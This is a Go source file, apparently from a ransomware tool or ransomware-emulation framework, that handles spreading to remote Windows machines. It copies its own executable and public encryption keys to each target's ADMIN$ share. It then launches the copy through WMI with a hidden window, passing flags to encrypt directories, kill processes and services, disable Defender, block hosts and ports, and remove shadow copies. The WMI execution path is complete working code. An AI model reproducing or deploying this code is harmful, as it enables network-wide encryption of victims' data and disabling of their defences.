package main

import (
	"fmt"
	"github.com/go-ole/go-ole"
	"github.com/go-ole/go-ole/oleutil"
	"io"
	"os"
	"strings"
	"sync"
	"unsafe"
)

func handleRemoteTargets(targets []string, args map[string]any, extension string, notename string, note string, group RansomActor, cipher string) {
	wg := sync.WaitGroup{}
	for _, target := range targets {
		wg.Add(1)
		target := target
		go func() {
			defer wg.Done()

			fmt.Println("Starting on target: ", target)
			copyName := RandStringBytes(12)
			copyName += ".exe"
			commandLine := ""
			executableLocation := fmt.Sprintf("\\\\%s\\ADMIN$\\%s", target, copyName)
			keyLocation := fmt.Sprintf("\\\\%s\\ADMIN$\\%s", target, RandStringBytes(12))
			if args["ecc_public"].(string) != "" {
				f, err := os.Create(keyLocation)
				if err != nil {
					printFormattedMessage(fmt.Sprintf("Failed to create key file on target %s: %s", target, err.Error()), ERROR)
					return
				}
				i, err := os.Open(args["ecc_public"].(string))
				if err != nil {
					printFormattedMessage(fmt.Sprintf("Failed to open key file %s: %s", args["ecc_public"].(string), err.Error()), ERROR)
					return
				}
				_, err = io.Copy(f, i)
				if err != nil {
					printFormattedMessage(fmt.Sprintf("Failed to copy key file %s to target %s: %s", args["ecc_public"].(string), target, err.Error()), ERROR)
					return
				}
			}
			if args["rsa_public"].(string) != "" {
				f, err := os.Create(keyLocation)
				if err != nil {
					printFormattedMessage(fmt.Sprintf("Failed to create key file on target %s: %s", target, err.Error()), ERROR)
					return
				}
				i, err := os.Open(args["rsa_public"].(string))
				if err != nil {
					printFormattedMessage(fmt.Sprintf("Failed to open key file %s: %s", args["rsa_public"].(string), err.Error()), ERROR)
					return
				}
				_, err = io.Copy(f, i)
				if err != nil {
					printFormattedMessage(fmt.Sprintf("Failed to copy key file %s to target %s: %s", args["rsa_public"].(string), target, err.Error()), ERROR)
					return
				}
			}
			err := copySelf(executableLocation)
			if err != nil {
				printFormattedMessage(fmt.Sprintf("Failed to copy self to target %s: %s", target, err.Error()), ERROR)
				// Theoretically we could encode exe as b64 and try to drop via powershell but let's not worry about this now
				return
			}
			commandLine = executableLocation
			commandLine = fmt.Sprintf("%s -skipconfirm -directory \"%s\"", commandLine, args["target"].(string))
			if args["recursive"].(bool) {
				commandLine = fmt.Sprintf("%s -recursive", commandLine)
			}
			commandLine = fmt.Sprintf("%s -force_note_name %s -force_extension %s -cipher %s -group %s -method %s", commandLine, notename, extension, cipher, group.Group, args["method"].(string))
			commandLine = fmt.Sprintf("%s -ep %d", commandLine, args["encryption_percent"].(int))
			commandLine = fmt.Sprintf("%s -threshold %d", commandLine, args["threshold_auto_fullencrypt"].(int64))
			commandLine = fmt.Sprintf("%s -workers %d", commandLine, args["workers"].(int))
			if args["killprocs"].(bool) {
				commandLine = fmt.Sprintf("%s -killprocs", commandLine)
			}
			if args["killservices"].(bool) {
				commandLine = fmt.Sprintf("%s -killservices", commandLine)
			}
			if args["defender"].(bool) {
				commandLine = fmt.Sprintf("%s -defender", commandLine)
			}
			if args["blockhosts"].(bool) {
				commandLine = fmt.Sprintf("%s -blockhosts", commandLine)
			}
			if args["blockports"].(bool) {
				commandLine = fmt.Sprintf("%s -blockports", commandLine)
			}
			if args["vss"].(bool) {
				commandLine = fmt.Sprintf("%s -vss", commandLine)
			}
			if args["rsa_public"].(string) != "" {
				commandLine = fmt.Sprintf("%s -rsa_public %s", commandLine, keyLocation)
			} else if args["ecc_public"].(string) != "" {
				commandLine = fmt.Sprintf("%s -ecc_public %s", commandLine, keyLocation)
			}

			// Always skip shares when deplopying remotely
			commandLine = fmt.Sprintf("%s -skipshares", commandLine)

			execute(commandLine, target, args["exec_method"].(string))
		}()
	}
	printFormattedMessage("Waiting for all remote targets to startup", INFO)
	wg.Wait()
}

func execute(commandLine string, target string, method string) {
	// If wmi, we will launch a process remotely
	if strings.ToLower(method) == "wmi" {
		executeWMI(commandLine, target)
	} else if strings.ToLower(method) == "service" {
		printFormattedMessage("Service method not yet implemented", ERROR)
	} else if strings.ToLower(method) == "schtask" {
		printFormattedMessage("Scheduled task method not yet implemented", ERROR)
	} else if strings.ToLower(method) == "reg" {
		printFormattedMessage("Registry method not yet implemented", ERROR)
	} else if strings.ToLower(method) == "startup" {
		printFormattedMessage("Startup method not yet implemented", ERROR)
	} else if strings.ToLower(method) == "mmc" {
		printFormattedMessage("MMC method not yet implemented", ERROR)
	} else {
		printFormattedMessage(fmt.Sprintf("Unknown method %s specified", method), ERROR)
		return
	}

}

func executeWMI(commandLine string, target string) {
	printFormattedMessage(fmt.Sprintf("Executing command on target %s: %s", target, commandLine), INFO)
	err := ExecuteCommandRemoteWMI(target, commandLine)
	if err != nil {
		printFormattedMessage(fmt.Sprintf("Failed to execute command on target %s: %s", target, err.Error()), ERROR)
	}
}

func ExecuteCommandRemoteWMI(remoteHost, command string) error {
	// Initialize COM
	if err := ole.CoInitializeEx(0, ole.COINIT_MULTITHREADED); err != nil {
		return fmt.Errorf("failed to initialize COM: %v", err)
	}
	defer ole.CoUninitialize()

	// Connect to WMI on remote host
	unknown, err := oleutil.CreateObject("WbemScripting.SWbemLocator")
	if err != nil {
		return fmt.Errorf("failed to create WbemScripting object: %v", err)
	}
	defer unknown.Release()

	wmi, err := unknown.QueryInterface(ole.IID_IDispatch)
	if err != nil {
		return fmt.Errorf("failed to query WMI interface: %v", err)
	}
	defer wmi.Release()

	// Connect to the remote host
	serviceRaw, err := oleutil.CallMethod(wmi, "ConnectServer", remoteHost, "root\\cimv2")
	if err != nil {
		return fmt.Errorf("failed to connect to remote host %s: %v", remoteHost, err)
	}
	service := serviceRaw.ToIDispatch()
	defer service.Release()

	// Create and execute the process
	processStartup := ole.NewVariant(ole.VT_BSTR, int64(uintptr(unsafe.Pointer(ole.SysAllocString("Win32_ProcessStartup")))))
	defer processStartup.Clear()

	processClass := oleutil.MustCallMethod(service, "Get", processStartup).ToIDispatch()
	defer processClass.Release()

	processInstance := oleutil.MustCallMethod(processClass, "SpawnInstance_").ToIDispatch()
	defer processInstance.Release()

	// Set process properties to hide window
	oleutil.PutProperty(processInstance, "ShowWindow", ole.NewVariant(ole.VT_I4, 0))

	// Create process
	process := ole.NewVariant(ole.VT_BSTR, int64(uintptr(unsafe.Pointer(ole.SysAllocString("Win32_Process")))))
	defer process.Clear()

	processClass = oleutil.MustCallMethod(service, "Get", process).ToIDispatch()
	defer processClass.Release()

	// Execute the command
	methodName := ole.NewVariant(ole.VT_BSTR, int64(uintptr(unsafe.Pointer(ole.SysAllocString("Create")))))
	defer methodName.Clear()

	cmd := ole.NewVariant(ole.VT_BSTR, int64(uintptr(unsafe.Pointer(ole.SysAllocString(command)))))
	defer cmd.Clear()

	currentDir := ole.NewVariant(ole.VT_BSTR, int64(uintptr(unsafe.Pointer(ole.SysAllocString("")))))
	defer currentDir.Clear()

	result, err := oleutil.CallMethod(processClass, "Create", cmd, currentDir, processInstance, 0)
	if err != nil {
		return fmt.Errorf("failed to execute command: %v", err)
	}

	// Get return code
	returnValue := int(result.Val)
	if returnValue != 0 {
		return fmt.Errorf("process creation failed with code %d", returnValue)
	}

	return nil
}
